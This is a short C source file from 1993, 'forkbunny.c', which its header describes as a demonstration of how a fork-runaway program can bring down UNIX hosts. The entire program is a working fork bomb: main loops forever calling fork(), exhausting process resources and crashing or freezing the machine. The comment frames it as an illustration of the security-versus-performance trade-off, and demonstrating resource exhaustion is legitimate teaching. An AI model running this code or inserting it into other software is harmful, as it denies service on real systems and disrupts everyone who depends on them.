/* -*- Mode:C; Coding:us-ascii-unix; fill-column:132 -*- */
/**********************************************************************************************************************************/
/**
   @file      forkbunny.c
   @author    Mitch Richling <http://www.mitchr.me/>
   @Copyright Copyright 1993 by Mitch Richling.  All rights reserved.
   @brief     fork-runaway program for UNIX@EOL
   @Keywords  UNIX fork runaway
   @Std       ISOC POSIX UNIX98
   @Tested    
              - Solaris 2.8
              - MacOS X.2
              - Linux (RH 7.3)

   This program demonstrates how dangerous a fork-runaway program can be on many UNIX hosts.  This program has the ability to bring
   down many versions of UNIX.  The reason is that it is more efficient not to check on the number of children a process has or how
   fast they are being produced.  This is the classic operating system tradeoff decision between security and performance being
   played out.
***********************************************************************************************************************************/

#include <sys/types.h>          /* UNIX types      POSIX */
#include <unistd.h>             /* UNIX std stf    POSIX */

/**********************************************************************************************************************************/
int main(int argc, char *argv[]) {
  while(1)
    fork();
  return 0;                     /* Never get here, but still.... :) */
} /* end func main */
